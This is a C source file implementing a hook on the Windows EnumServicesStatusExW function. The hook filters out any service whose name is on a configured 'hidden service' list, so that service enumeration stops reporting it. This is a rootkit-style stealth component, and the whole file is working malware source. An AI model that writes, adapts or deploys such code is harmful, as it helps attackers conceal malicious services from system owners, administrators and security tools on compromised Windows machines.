#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <winsvc.h>
#include "ntdll.h"

#include "config.h"

#include "enumservicesstatusexw.h"

// advapi32.EnumServicesStatusExW
BOOL WINAPI NewEnumServicesStatusExW(
	SC_HANDLE hSCManager,
	SC_ENUM_TYPE InfoLevel,
	DWORD dwServiceType,
	DWORD dwServiceState,
	LPBYTE lpServices,
	DWORD cbBufSize,
	LPDWORD pcbBytesNeeded,
	LPDWORD lpServicesReturned,
	LPDWORD lpResumeHandle,
	LPCTSTR pszGroupName
)
{
	BOOL b;
	
	// call original function
	b=OldEnumServicesStatusExW(
			hSCManager,
			InfoLevel,
			dwServiceType,
			dwServiceState,
			lpServices,
			cbBufSize,
			pcbBytesNeeded,
			lpServicesReturned,
			lpResumeHandle,
			pszGroupName
			);
	
	if (b || GetLastError()==ERROR_MORE_DATA)
	{
		DWORD dwNrOfSvc,dwCount;
		ENUM_SERVICE_STATUS_PROCESSW* pEnum=(ENUM_SERVICE_STATUS_PROCESSW*)lpServices;
		UNICODE_STRING usSvcName;
		ANSI_STRING asSvcName;
		
		lpResumeHandle=NULL;
		dwNrOfSvc=*lpServicesReturned;
		for (dwCount=0;dwCount<dwNrOfSvc;dwCount++)
		{
			RtlInitUnicodeString(&usSvcName,pEnum->lpServiceName);
			if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&asSvcName,&usSvcName,TRUE)))
			{
				if (config_CheckString(ConfigHiddenService,asSvcName.Buffer,asSvcName.Length))
				{
					RtlZeroMemory(pEnum->lpDisplayName,wcslen(pEnum->lpDisplayName));
					RtlZeroMemory(pEnum->lpServiceName,wcslen(pEnum->lpServiceName));
					RtlCopyMemory((char*)pEnum,(char*)pEnum+sizeof(ENUM_SERVICE_STATUS_PROCESSW),sizeof(ENUM_SERVICE_STATUS_PROCESSW)*(dwNrOfSvc-(dwCount+1))); // hide handle
        			RtlZeroMemory((char*)pEnum+sizeof(ENUM_SERVICE_STATUS_PROCESSW)*(dwNrOfSvc-(dwCount+1)),sizeof(ENUM_SERVICE_STATUS_PROCESSW)); // delete last row
        			(*lpServicesReturned)--; // change number of services
				}
				else
					pEnum++;
				
				RtlFreeAnsiString(&asSvcName);
			}
			else
				pEnum++;
		}
	}

	return b;	
}
